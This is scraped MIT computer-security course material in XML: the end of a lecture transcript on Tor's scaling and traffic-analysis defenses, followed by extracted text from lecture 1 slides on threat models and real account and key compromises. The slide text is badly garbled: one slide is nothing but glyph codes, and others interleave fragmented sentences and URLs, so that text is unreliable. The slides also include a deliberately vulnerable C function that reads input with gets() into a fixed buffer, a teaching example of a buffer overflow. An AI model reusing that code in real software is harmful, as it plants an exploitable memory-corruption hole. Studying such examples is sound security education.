              <time_slice>1:17:03</time_slice>
              <text_slice>I'm not going to have time
to work on it in 2015.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:05</time_slice>
              <text_slice>But if somebody else wants
to hack on that, my god,</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:08</time_slice>
              <text_slice>that would be fun.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:08</time_slice>
              <text_slice>Our congestion
control algorithms</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:10</time_slice>
              <text_slice>were chosen questionably based
on what we could hack together</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:15</time_slice>
              <text_slice>in a week.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:17</time_slice>
              <text_slice>We've improved them, but they
could use a bigger revamp.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:20</time_slice>
              <text_slice>There's some research on
scaling to hundreds of thousands</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:23</time_slice>
              <text_slice>of nodes.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:24</time_slice>
              <text_slice>So in the current
design, we can probably</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:26</time_slice>
              <text_slice>get up to 10,000 or
20,000 with no problem.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:29</time_slice>
              <text_slice>But because we assume that every
client knows about every node,</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:33</time_slice>
              <text_slice>and every node may be
connected to every other node,</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:35</time_slice>
              <text_slice>that's going to stop
scaling before 100,000.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:38</time_slice>
              <text_slice>And we need to do
something about that.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:41</time_slice>
              <text_slice>That opens up some
classes of attacks</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:43</time_slice>
              <text_slice>based on attackers learning
which clients know which nodes</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:47</time_slice>
              <text_slice>and using that to
distinguish clients.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:50</time_slice>
              <text_slice>So most of the naive
approaches are a bad idea here.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:52</time_slice>
              <text_slice>But it may be that less naive
approaches might work out.</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:56</time_slice>
              <text_slice>Another thing you might want to
do if you're increasing 100,000</text_slice>
            </slice>
            <slice>
              <time_slice>1:17:59</time_slice>
              <text_slice>nodes is get rid of those
centralized directory</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:02</time_slice>
              <text_slice>authorities and go to some
kind of peer to peer design.</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:05</time_slice>
              <text_slice>I don't have extremely
high confidence</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:10</time_slice>
              <text_slice>in the peer to peer
designs I know of so far.</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:12</time_slice>
              <text_slice>But it could be that
somebody's about to advance</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:16</time_slice>
              <text_slice>the next good one.</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:20</time_slice>
              <text_slice>Let's see, I don't
know what that means.</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:23</time_slice>
              <text_slice>Oh, somebody asked a
question about adding</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:26</time_slice>
              <text_slice>padding traffic or fake
traffic to try to deceive end</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:33</time_slice>
              <text_slice>to end traffic correlation.</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:34</time_slice>
              <text_slice>This is an exciting
research field</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:36</time_slice>
              <text_slice>that needs someone smarter
to work on it or someone</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:40</time_slice>
              <text_slice>with a more practical attitude
to work on it than has</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:42</time_slice>
              <text_slice>previously worked on it.</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:44</time_slice>
              <text_slice>Too many of the results
in the research literature</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:47</time_slice>
              <text_slice>there are only about
distinguishing the traffic</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:51</time_slice>
              <text_slice>of two users on a number
containing one relay,</text_slice>
            </slice>
            <slice>
              <time_slice>1:18:55</time_slice>
              <text_slice>because that's how the
math was easy to do.</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:00</time_slice>
              <text_slice>So because of this
kind of stuff,</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:02</time_slice>
              <text_slice>all of the traffic
analysis defenses</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:04</time_slice>
              <text_slice>that we know of in this
area that are still</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:06</time_slice>
              <text_slice>compatible with broad
browsing, they sound good</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:10</time_slice>
              <text_slice>if you read the abstract.</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:11</time_slice>
              <text_slice>You'll say, hooray, this
one forces the attacker</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:14</time_slice>
              <text_slice>to gather three times as
much traffic before they</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:17</time_slice>
              <text_slice>can correlate users.</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:19</time_slice>
              <text_slice>Except when you
actually read the paper,</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:20</time_slice>
              <text_slice>previously the attacker needed
two seconds worth of traffic,</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:23</time_slice>
              <text_slice>and then they won.</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:24</time_slice>
              <text_slice>Now they need six seconds.</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:26</time_slice>
              <text_slice>That's not really a
defence in this model,</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:29</time_slice>
              <text_slice>although perhaps
against a real network,</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:33</time_slice>
              <text_slice>the numbers would be
different and it might work.</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:35</time_slice>
              <text_slice>So we would actually like
to see some stuff done</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:38</time_slice>
              <text_slice>with padding and fake traffic.</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:40</time_slice>
              <text_slice>But we don't like to
add voodoo defenses</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:43</time_slice>
              <text_slice>that we conjecture to
maybe do some good,</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:45</time_slice>
              <text_slice>although we can't do that.</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:47</time_slice>
              <text_slice>We actually like
to have evidence</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:48</time_slice>
              <text_slice>that any changes
we're going to make</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:50</time_slice>
              <text_slice>are going to help something.</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:51</time_slice>
              <text_slice>I think I'm out of time.</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:53</time_slice>
              <text_slice>And there may be a
class in here after us?</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:55</time_slice>
              <text_slice>There is not?</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:55</time_slice>
              <text_slice>All right, so I'm going to
hang around for a while.</text_slice>
            </slice>
            <slice>
              <time_slice>1:19:58</time_slice>
              <text_slice>And thanks for coming to listen.</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:00</time_slice>
              <text_slice>I would take questions now.</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:02</time_slice>
              <text_slice>But it's 12:25, and folks
may have another class.</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:06</time_slice>
              <text_slice>But I'll be around [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:07</time_slice>
              <text_slice>Thank you very much for coming.</text_slice>
            </slice>
            <slice>
              <time_slice>1:20:08</time_slice>
              <text_slice>[APPLAUSE]</text_slice>
            </slice>
          </transcript>
        </video>
      </videos>
    </lecture>
    <lecture>
      <lecture_title>Introduction, Threat Models (PDF)</lecture_title>
      <lecture_pdf_url>https://ocw.mit.edu/courses/6-858-computer-systems-security-fall-2014/resources/mit6_858f14_lec1/</lecture_pdf_url>
      <lectureno>1</lectureno>
      <slides>
        <slide>
          <slideno>3</slideno>
          <text>/g1
 /g16/g39/g30/g1/g46/g39/g30/g49/g41/g30/g28/g45/g30/g29/g1/g48/g26/g50/g1/g34/g39/g1/g48/g33/g34/g28/g33/g1/g16/g20/g64/g30/g44/g1/g48/g30/g43/g30/g1/g28/g40/g38/g41/g43/g40/g38/g34/g44/g30/g29/g54/g1/g26/g29/g47/g30/g43/g44/g26/g43/g50/g1/g32/g26/g34/g39/g30/g29/g1
/g26/g28/g28/g30/g44/g44/g1/g45/g40/g1/g29/g30/g47/g30/g37/g40/g41/g38/g30/g39/g45/g1/g44/g50/g44/g45/g30/g38/g44/g52/g1/g38/g40/g29/g34/g31/g34/g30/g29/g1/g16/g20/g1/g28/g40/g29/g30/g55/g1
/g6/g49/g26/g38/g41/g37/g30/g54/g1/g44/g46/g27/g47/g30/g43/g45/g34/g39/g32/g1/g31/g34/g43/g30/g48/g26/g37/g37/g44/g55/g1
 /g2/g29/g47/g30/g43/g44/g26/g43/g34/g30/g44/g1/g28/g26/g39/g1/g28/g40/g39/g39/g30/g28/g45/g1/g45/g40/g1/g26/g39/g1/g46/g39/g44/g30/g28/g46/g43/g30/g29/g1/g48/g34/g43/g30/g37/g30/g44/g44/g1/g27/g30/g33/g34/g39/g29/g1/g31/g34/g43/g30/g48/g26/g37/g37/g1

 
 /g2/g29/g47/g30/g43/g44/g26/g43/g34/g30/g44/g1/g28/g26/g39/g1/g45/g43/g34/g28/g36/g1/g46/g44/g30/g43/g1/g27/g30/g33/g34/g39/g29/g1/g31/g34/g43/g30/g48/g26/g37/g37/g1/g45/g40/g1/g29/g34/g44/g26/g27/g37/g30/g1/g31/g34/g43/g30/g48/g26/g37/g37/g1
/g14/g34/g32/g33
o /g45/g1/g44
/g16/g43/g1/g38/g26/g50/g27/g30/g1/g27/g46/g50/g1/g26/g39/g1/g26/g29/g1/g40/g39/g1/g4/g46/g31/g31/g34/g28/g30/g1/g35/g46/g44/g45/g1/g45/g40/g1/g28/g37/g34/g28/g36/g1/g40/g39/g1/g37/g34/g39/g36/g1/g138/g150/g150/g146/g483/g512/g512/g136/g139/g148/g135/g153/g131/g142/g142/g512/g491/g131/g133/g150/g139/g145/g144/g945/g134/g139/g149/g131/g132/g142/g135
/g15/g15/g55/g28/g40/g38/g1/g41/g40/g34/g39/g45/g34/g39/g32/g1/g45/g40/g1/g45/g33/g26/g45/g1/g22/g19/g13/g1/g60/g30/g31/g31/g30/g28/g45/g34/g47/g30/g37/g50/g61/g58/g1
/g1
/g6/g49/g26/g38/g41/g37/g30/g54/g1/g38/g26/g28/g33/g34/g39/g30/g44/g1/g29/g34/g44/g28/g40/g39/g39/g30/g28/g45/g30/g29/g1/g31/g43/g40/g38/g1/g45/g33/g30/g1/g10/g39/g45/g30/g43/g39/g30/g45/g1/g26/g43/g30/g1/g44/g30/g28/g46/g43/g30/g58/g1

 /g20/g45/g46/g49/g39/g30/g45/g1/g48/g40/g43/g38/g1/g44/g41/g43/g30/g26/g29/g1/g47/g34/g26/g1/g44/g41/g30/g28/g34/g26/g37/g37/g50/g56/g28/g40/g39/g44/g45/g43/g46/g28/g45/g30/g29/g1/g31/g34/g37/g30/g44/g1/g40/g39/g1/g22/g20/g3/g1/g29/g43/g34/g47/g30/g44/g55/g1
/g1
/g9/g40/g48/g1/g45/g40/g1/g44/g40/g37/g47/g30/g58/g1
 /g14/g40/g43/g30/g1/g30/g49/g41/g37/g34/g28/g34/g45/g1/g45/g33/g43/g30/g26/g45/g1/g38/g40/g29/g30/g37/g44/g52/g1/g45/g40/g1/g46/g39/g29/g30/g43/g44/g45/g26/g39/g29/g1/g41/g40/g44/g44/g34/g27/g37/g30/g1/g48/g30/g26/g36/g39/g30/g44/g44/g30/g44/g55/g1
 /g20/g34/g38/g41/g37/g30/g43/g52/g1/g38/g40/g43/g30/g1/g32/g30/g39/g30/g43/g26/g37/g1/g45/g33/g43/g30/g26/g45/g1/g38/g40/g29/g30/g37/g44/g55/g1
 /g3/g30/g45/g45/g30/g43/g1/g29/g30/g44/g34/g32/g39/g44/g1/g38/g26/g50/g1/g30/g37/g34/g38/g34/g39/g26/g45/g30/g1/g59/g1/g37/g30/g44/g44/g30/g39/g1/g43/g30/g37/g34/g26/g39/g28/g30/g1/g40/g39/g1/g28/g30/g43/g45/g26/g34/g39/g1/g26/g44/g44/g46/g38/g41/g45/g34/g40/g39/g44/g55/g1
o /g6/g55/g32/g55/g52/g1/g26/g37/g45/g30/g43/g39/g26/g45/g34/g47/g30/g1/g45/g43/g46/g44/g45/g1/g38/g40/g29/g30/g37/g44/g1/g45/g33/g26/g45/g1/g29/g40/g39/g64/g45/g1/g33/g26/g47/g30/g1/g31/g46/g37/g37/g50/g56/g45/g43/g46/g44/g45/g30/g29/g1/g4/g2/g44/g55/g1
o /g6/g55/g32/g55/g52/g1/g26/g46/g45/g33/g30/g39/g45/g34/g28/g26/g45/g34/g40/g39/g1/g38/g30/g28/g33/g26/g39/g34/g44/g38/g44/g1/g45/g33/g26/g45/g1/g26/g43/g30/g39/g64/g45/g1/g44/g46/g44/g28/g30/g41/g45/g34/g27/g37/g30/g1/g45/g40/g1/g41/g33/g34/g44/g33/g34/g39/g32/g55/g1
/g1
/g24/g33/g26/g45/g1/g32/g40/g30/g44/g1/g48/g43/g40/g39/g32/g1/g68/g72/g54/g1/g41/g43/g40/g27/g37/g30/g38/g44/g1/g48/g34/g45/g33/g1/g45/g33/g30/g1/g38/g30/g28/g33/g26/g39/g34/g44/g38/g1/g56/g56/g1
/g1
/g3/g46/g32/g44
/g1/g34/g39/g1/g45/g33/g30/g1/g44/g30/g28/g46/g43/g34/g45/g50/g1/g38/g30/g28/g33/g26/g39/g34/g44/g38/g1/g60/g30/g55/g32/g55/g52/g1/g16/g20/g1/g36/g30/g43/g39/g30/g37/g61/g1/g37/g30/g26/g29/g1/g45/g40/g1/g47/g46/g37/g39/g30/g43/g26/g27/g34/g37/g34/g45/g34/g30/g44/g55/g1/g10/g31/g1
/g26/g41/g41/g37/g34/g28/g26/g45/g34/g40/g39/g1/g34/g44/g1/g30/g39/g31/g40/g43/g28/g34/g39/g32/g1/g44/g30/g28/g46/g43/g34/g45/g50/g52/g1/g26/g41/g41/g56/g37/g30/g47/g30/g37/g1/g27/g46/g32/g44/g1/g37/g30/g26/g29/g1/g45/g40/g1/g47/g46/g37/g39/g30/g43/g26/g27/g34/g37/g34/g45/g34/g30/g44/g55/g1
/g1/g6/g49/g26/g38/g41/g37/g30/g54/g1/g2/g41/g41/g37/g30/g64/g44/g1/g34/g4 /g37/g40/g46/g29/g1/g41/g26/g44/g44/g48/g40/g43/g29/g56/g32/g46/g30/g44/g44/g34/g39/g32/g1/g43/g26/g45/g30/g1/g37/g34/g38/g34/g45/g44/g55/g1
/g33/g45/g45/g41/g44/g54/g59/g59/g32/g34/g45/g33/g46/g27/g55/g28/g40/g38/g59/g33/g26/g28/g36/g26/g41/g41/g28/g40/g38/g59/g34/g27/g43/g46/g45/g30/g1
 /g17/g30/g40/g41/g37/g30/g1/g40/g31/g45/g30/g39/g1/g41/g34/g28/g36/g1/g48/g30/g26/g36/g1/g41/g26/g44/g44/g48/g40/g43/g29/g44/g53/g1/g28/g26/g39/g1/g40/g31/g45/g30/g39/g1/g32/g46/g30/g44/g44/g1/g48/g59/g1/g31/g30/g48/g1/g26/g45/g45/g30/g38/g41/g45/g44/g1/g60/g70/g12/g56/g70/g14/g61/g55/g1
 /g14/g40/g44/g45/g1/g44/g30/g43/g47/g34/g28/g30/g44/g52/g1/g34/g39/g28/g37/g46/g29/g34/g39/g32/g1/g2/g41/g41/g37/g30/g64/g44/g1/g34/g4/g37/g40/g46/g29/g52/g1/g43/g26/g45/g30/g56/g37/g34/g38/g34/g45/g1/g37/g40/g32/g34/g39/g1/g26/g45/g45/g30/g38/g41/g45/g44/g55/g1
 /g2/g41/g41/g37/g30/g64/g44/g1/g34/g4/g37/g40/g46/g29/g1/g44/g30/g43/g47/g34/g28/g30/g1/g33/g26/g44/g1/g38/g26/g39/g50/g1/g2/g17/g10/g44/g55/g1
 /g16/g39/g30/g1/g2/g17/g10/g1/g60/g45/g33/g30/g1/g65/g7/g34/g39/g29/g1/g38/g50/g1/g34/g17/g33/g40/g39/g30/g65/g1/g44/g30/g43/g47/g34/g28/g30/g61/g1/g31/g40/g43/g32/g40/g45/g1/g45/g40/g1/g34/g38/g41/g37/g30/g38/g30/g39/g45/g1/g43/g26/g45/g30/g56/g37/g34/g38/g34/g45/g34/g39/g32/g55/g1
 /g2/g29/g47/g30/g43/g44/g26/g43/g50/g1/g28/g40/g46/g37/g29/g1/g38/g26/g36/g30/g1/g38/g26/g39/g50/g1/g26/g45/g45/g30/g38/g41/g45/g44/g1/g26/g45/g1/g32/g46/g30 /g44/g44/g34/g39/g32/g1/g41/g26/g44/g44/g48/g40/g43/g29/g44/g55/g1
 /g17/g43/g40/g27/g26/g27/g37/g50/g1/g26/g44/g1/g31/g26/g44/g45/g1/g26/g44/g1/g45/g33/g30/g50/g1/g28/g26/g39/g1/g44/g30/g39/g29/g1/g41/g26/g28/g36/g30/g45 /g44/g54/g1/g80/g80/g14/g59/g29/g26/g50/g55/g1
/g1/g6/g49/g26/g38/g41/g37/g30/g54/g1/g14/g34/g44/g44/g34/g39/g32/g1/g26/g28/g28/g30/g44/g44/g1/g28/g40/g39/g45/g43/g40/g37/g1/g28/g33/g30/g28/g36/g44/g1/g34/g39/g1/g4/g34/g45/g34/g32/g43/g40/g46/g41/g64/g44/g1/g28/g43/g30/g29/g34/g45/g1/g28/g26/g43/g29/g1/g48/g30/g27/g1/g44/g34/g45/g30/g55/g1
/g33/g45/g45/g41/g54/g59/g59/g48/g48/g48/g55/g39/g50/g45/g34/g38/g30/g44/g55/g28/g40/g38/g59/g71/g69/g70/g70/g59/g69/g75/g59/g70/g73/g59/g45/g30/g28/g33/g39/g40/g37/g40/g32/g50/g59/g70/g73/g44/g30/g28/g46/g43/g34/g45/g50/g55/g33/g45/g38/g37/g1
 /g4/g34/g45/g34/g32/g43/g40/g46/g41/g1/g26/g37/g37/g40/g48/g30/g29/g1/g28/g43/g30/g29/g34/g45/g1/g28/g26/g43/g29/g1/g46/g44/g30/g43/g44/g1/g45/g40/g1/g26/g28/g28/g30/g44/g44/g1/g45/g33/g30/g34/g43/g1/g26/g28/g28/g40/g46/g39/g45/g44/g1/g40/g39/g37/g34/g39/g30/g55/g1
o /g13/g40/g32/g34/g39/g1/g41/g26/g32/g30/g1/g26/g44/g36/g44/g1/g31/g40/g43/g1/g46/g44/g30/g43/g39/g26/g38/g30/g1/g26/g39/g29/g1/g41/g26/g44/g44/g48/g40/g43/g29/g55/g1
o /g10/g31/g1/g46/g44/g30/g43/g39/g26/g38/g30/g1/g26/g39/g29/g1/g41/g26/g44/g44/g48/g40/g43/g29/g1/g16/g12/g52/g1/g43/g30/g29/g34/g43/g30/g28/g45/g30/g29/g1/g45/g40/g1/g26/g28/g28/g40/g46/g39/g45/g1/g34/g39/g31/g40/g1/g41/g26/g32/g30/g55/g1
 /g21/g33/g30/g1/g22/g19/g13/g1/g40/g31/g1/g45/g33/g30/g1/g26/g28/g28/g40/g46/g39/g45/g1/g34/g39/g31/g40/g1/g41/g26/g32/g30/g1/g34/g39/g28/g37/g46/g29/g30/g29/g1/g44/g40/g38/g30/g1/g39/g46/g38/g27/g30/g43/g44/g55/g1
o /g21/g46/g43/g39/g44/g1/g40/g46/g45/g1/g45/g33/g30/g1/g39/g46/g38/g27/g30/g43/g44/g1/g48/g30/g43/g30/g1/g60/g43/g30/g37/g26/g45/g30/g29/g1/g45/g40/g61/g1/g45/g33/g30/g1/g46/g44/g30/g43/g64/g44/g1/g26/g28/g28/g40/g46/g39/g45/g1/g39/g46/g38/g27/g30/g43/g55/g1
o /g24/g40/g43/g44/g30/g1/g50/g30/g45/g52/g1/g44/g30/g43/g47/g30/g43/g1/g29/g34/g29/g39/g64/g45/g1/g28/g33/g30/g28/g36/g1/g45/g33/g26/g45/g1/g50/g40/g46/g1/g48/g30/g43/g30/g1/g37/g40/g32/g32/g30/g29/g1/g34/g39/g45/g40/g1/g45/g33/g26/g45/g1/g26/g28/g28/g40/g46/g39/g45/g55/g1
 /g2/g29/g47/g30/g43/g44/g26/g43/g50/g1/g45/g43/g34/g30/g29/g1/g29/g34/g31/g31/g30/g43/g30/g39/g45/g1/g39/g46/g38/g27/g30/g43/g44/g52/g1/g32/g40/g45/g1/g29/g34/g31/g31/g30/g43/g30/g39/g45/g1/g41/g30/g40/g41/g37/g30/g64/g44/g1/g26/g28/g28/g40/g46/g39/g45/g1/g34/g39/g31/g40/g55/g1
 /g17/g40/g44/g44/g34/g27/g37/g50/g1/g26/g1/g48/g43/g40/g39/g32/g1/g45/g33/g43/g30/g26/g45/g1/g38/g40/g29/g30/g37/g54/g1/g29/g40/g30/g44/g39/g64/g45/g1/g38/g26/g45/g28/g33/g1/g45/g33/g30/g1/g43/g30/g26/g37/g1/g48/g40/g43/g37/g29/g58/g1
o /g20/g50/g44/g45/g30/g38/g1/g34/g44/g1/g44/g30/g28/g46/g43/g30/g1/g34/g31/g1/g26/g29/g47/g30/g43/g44/g26/g43/g50/g1/g27/g43/g40/g48/g44/g30/g44/g1/g45/g33/g30/g1/g48/g30/g27/g1/g44/g34/g45/g30/g1/g45/g33/g43/g40/g46/g32/g33/g1/g27/g43/g40/g48/g44/g30/g43/g55/g1/g27/g46/g32/g44/g55/g1
4</text>
        </slide>
        <slide>
          <slideno>4</slideno>
          <text>o
System	&#13; not	&#13; secure	&#13; if	&#13; adversary	&#13; synthesizes	&#13; new	&#13; URLs	&#13; on	&#13; their	&#13; own.	&#13; 
	&#13;  
 Hard	&#13; to	&#13; say	&#13; if	&#13; developers	&#13; had	&#13; wrong	&#13; threat	&#13; model,	&#13; or	&#13; buggy	&#13; mechanism.	&#13; 
Example:	&#13; Android's	&#13; Java	&#13; SecureRandom	&#13; weakness	&#13; leads	&#13; to	&#13; Bitcoin	&#13; theft.	&#13; 
https://b
 
 Bitcoitcoin.o
ins	&#13; can	&#13; berg/en
	&#13; s/
pealert
nt	&#13; by	&#13; anyo/2013-08-11- oid	&#13; 
 ne	&#13; that	&#13; knoandr
Many	&#13; Bitcoin	&#13; wallet	&#13; apps	&#13; on	&#13; Android	&#13; used	&#13; Java's	&#13; SecureRandom	&#13; API.	&#13; ws	&#13; the	&#13; owner's	&#13; private	&#13; key. 	&#13; 
  Turns	&#13; out	&#13; the	&#13; system	&#13; was	&#13; sometimes	&#13; forgetting	&#13; to	&#13; seed	&#13; the	&#13; PRNG!As	&#13; a	&#13; result,	&#13; some	&#13; Bitcoin	&#13; keys	&#13; turned	&#13; out	&#13; to	&#13; be	&#13; easy	&#13; to	&#13; guess. 	&#13; 	&#13; 
	&#13; Adversaries	&#13; searched	&#13; for	&#13; guessable	&#13; keys,	&#13; spent	&#13; any	&#13; corresponding	&#13; bitcoins.	&#13; 
Example:	&#13; bugs	&#13; in	&#13; sandbox	&#13; (NaC
 Allows	&#13; adversary	&#13; to	&#13; escape	&#13; isolation,	&#13; do	&#13; operations	&#13; they	&#13; weren't	&#13; supposed	&#13; l,	&#13; Javascript,	&#13; Java	&#13; runtime).	&#13; 
	&#13; to.	&#13; 
Example:	&#13; Moxie's	&#13; SSL	&#13; certificate	&#13; name	&#13; checking	&#13; bug	&#13; 
	&#13;  Null	&#13; byte	&#13; vs.	&#13; length -encoding. 	&#13; 
Example:	&#13; buffer	&#13; overflows	&#13; (see	&#13; below).	&#13; 
	&#13; 
Case	&#13; study:	&#13; 
wb
secuConsider	&#13; 
rity.	&#13; E.g.,	&#13; checking	&#13; which	&#13; URLa	&#13;  ebuffer	&#13; 
	&#13; server.overfl
	&#13; Often	&#13; times,	&#13; the	&#13; web	&#13; server's	&#13; code	&#13; is	&#13; responsible	&#13; for	&#13; ows. 	&#13; 
Thus,	&#13; bugs	&#13; in	&#13; the	&#13; server's	&#13; code	&#13; can	&#13; lead	&#13; to	&#13; security	&#13; compromises.	&#13; s	&#13; can	&#13;  be	&#13; accessed,	&#13; checking	&#13; SSL	&#13; client	&#13; certs, 	&#13; etc.	&#13; 
	&#13; 
What's	&#13; the	&#13; threat	&#13; model,	&#13; policy?	&#13; 
 
 
 Assume	&#13; that	&#13; adversary	&#13; can	&#13; connect	&#13; to	&#13; web	&#13; server,	&#13; supply	&#13; any	&#13; inputs.	&#13; 
Policy	&#13; is	&#13; a	&#13; bit	&#13; fuzzy:	&#13; only	&#13; perform	&#13; operations	&#13; intended	&#13; by	&#13; programmer?	&#13; 
	&#13; E.g.,	&#13; don't	&#13; want	&#13; adversary	&#13; to	&#13; steal	&#13; data,	&#13; bypass	&#13; checks,	&#13; install	&#13; backdoors. 	&#13; 
C
	&#13; 
    int read_req(void) {onsider	&#13; the	&#13; following	&#13; simplified	&#13; example	&#13; code	&#13; from,	&#13; say,	&#13; a	&#13; web	&#13; server:
 	&#13; 
      char buf[128]; 
      int i; 
      gets(buf);       i = atoi(buf); 
      return i; 
    
	&#13; 
	&#13; } 
	&#13; 	&#13; 
	&#13; 	&#13; 
5</text>
        </slide>
        <slide>
          <slideno>1</slideno>
          <text>Better	&#13; security	&#13; often	&#13; makes	&#13; new	&#13; functionality	&#13; practical	&#13; and	&#13; safe.	&#13; Suppose	&#13; you	&#13; want	&#13; 	&#13; 
Insecure	&#13; system	&#13; may	&#13; require	&#13; manual	&#13; auditing	&#13; to	&#13; check	&#13; for	&#13; attacks,	&#13; etc.	&#13; 
	&#13; 	&#13;   Higher	&#13; cost	&#13; of	&#13; attack	&#13; means	&#13; more	&#13; adversaries	&#13; will	&#13; be	&#13; deterred.	&#13; 
to	&#13; run	&#13; some	&#13; application	&#13; on	&#13; your	&#13; system.	&#13; Large	&#13; companies	&#13; sometimes	&#13; prohibit	&#13; users	&#13; 
from	&#13; installing	&#13; software	&#13; that	&#13; hasn't	&#13; been	&#13; approved	&#13; 
security.	&#13; Javascript	&#13; in	&#13; the	&#13; browser	&#13; is	&#13; isolated,	&#13; making	&#13; it	&#13; ok	&#13; (for	&#13; the	&#13; most	&#13; part)	&#13; to	&#13; run	&#13; on	&#13; their	&#13; desktops,	&#13; partly	&#13; due	&#13; to	&#13; 
new	&#13; code/applications	&#13; without	&#13; manual	&#13; inspection/approval	&#13; (or	&#13; virtual	&#13; machines,	&#13; or	&#13; Native	&#13; C
to	&#13; mitigate	&#13; risk	&#13; of	&#13; allowing	&#13; employees	&#13; to	&#13; connect	&#13; to	&#13; a	&#13; corporate	&#13; network	&#13; from	&#13; lient,	&#13; or	&#13; better	&#13; OS	&#13; isolation	&#13; mechanisms).	&#13; Similarly,	&#13; VPNs	&#13; make	&#13; it	&#13; practical	&#13; 
anywhere
What	&#13; goes	&#13; wrong	&#13; #1:	&#13; problems	&#13; with	&#13; the	&#13; policy.	&#13; 	&#13; 	&#13; on	&#13; the	&#13; Internet. 	&#13; 
	&#13; 
Example:	&#13; Sarah	&#13; Palin's	&#13; email	&#13; account.	&#13; 
http://en.w
 
 ikipedia.org/wiki/Sara
 IfYahoo	&#13; email	&#13; accounts	&#13; have	&#13; a	&#13; username,	&#13; password,	&#13; and	&#13; security	&#13; questions.	&#13; 
User	&#13; can	&#13; log	&#13; in	&#13; by	&#13; supplying	&#13; username	&#13; and	&#13; password.	&#13; h_Palin_email_hack	&#13; 
 
 Security	&#13; questions	&#13; can	&#13; sometimes	&#13; be	&#13; easier	&#13; to	&#13; guess	&#13; 	&#13; user	&#13; forgets	&#13; password,	&#13; can	&#13; reset	&#13; by	&#13; answering	&#13; secur
thity	&#13; Qs
an	&#13; pas.	&#13; 
 Some	&#13; adversary	&#13; guessed	&#13; Sarah	&#13; Palin's	&#13; high	&#13; school,	&#13; birthday,	&#13; etc.	&#13; sword.	&#13; 
Policy	&#13; amounts	&#13; to:	&#13; can	&#13; log	&#13; in	&#13; with	&#13; either	&#13; password	&#13; or	&#13; security	&#13; Qs.	&#13; 
enforce	&#13; "Only	&#13; if	&#13; user	&#13; forgets	&#13; password,	&#13; then	&#13; ...")(no	&#13; way	&#13; to	&#13; 
Example:	&#13; Mat	&#13; H	&#13; 	&#13; 
http://www.wired.com/gadgetlabonan's	&#13; accounts	&#13; at	&#13; Amazon,	&#13; Apple,	&#13; Google,	&#13; etc.	&#13; 
hack
 ing/all/	&#13; /2012/08/apple -amazon-mat-honan-
Gmail	&#13; password	&#13; reset:	&#13; send	&#13; a	&#13; verification	&#13; link	&#13; to	&#13; a	&#13; backup	&#13; email	&#13; address.
o 
o Google	&#13; helpfully	&#13; prints	&#13; part	&#13; of	&#13; the	&#13; backup	&#13; email	&#13; address.	&#13; 	&#13; 
 Apple	&#13; password	&#13; reset:	&#13; need	&#13; billing	&#13; address,	&#13; last	&#13; 4	&#13; digits	&#13; of	&#13; credit	&#13; card.	&#13; 
o Mat	&#13; Honan's	&#13; backup	&#13; address	&#13; wa s	&#13; his	&#13; Apple	&#13; @me.com	&#13; account.	&#13; 
